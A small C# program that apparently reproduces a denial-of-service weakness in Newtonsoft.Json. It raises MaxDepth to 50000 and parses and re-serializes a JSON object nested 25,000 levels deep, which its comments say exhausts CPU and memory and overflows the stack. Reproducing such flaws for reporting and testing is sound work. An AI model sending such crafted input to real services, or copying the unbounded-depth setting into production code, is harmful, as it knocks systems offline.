using Newtonsoft.Json;

namespace testProj1
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello, World!");

            //var settings = JsonConvert.DefaultSettings;

            JsonConvert.DefaultSettings = () => new JsonSerializerSettings { MaxDepth = 50000 };


            //Create a string representation of an highly nested object (JSON serialized)
            int nRep = 25000;
            string json =
                string.Concat(Enumerable.Repeat("{a:", nRep)) +
                "1" +
                string.Concat(Enumerable.Repeat("}", nRep));

            //Parse this object (leads to high CPU/RAM consumption)
            var parsedJson = JsonConvert.DeserializeObject(json);

            // Methods below all throw stack overflow with nRep around 20k and higher
            string a = parsedJson.ToString();
            string b = JsonConvert.SerializeObject(parsedJson);






            //"/[Newtonsoft.Json]Newtonsoft.Json/JsonReader.<init>()/System/Void",
            //"/[Newtonsoft.Json]Newtonsoft.Json/JsonSerializerSettings.get_MaxDepth()/System/Nullable{/System/Int32}"







        }
    }
}
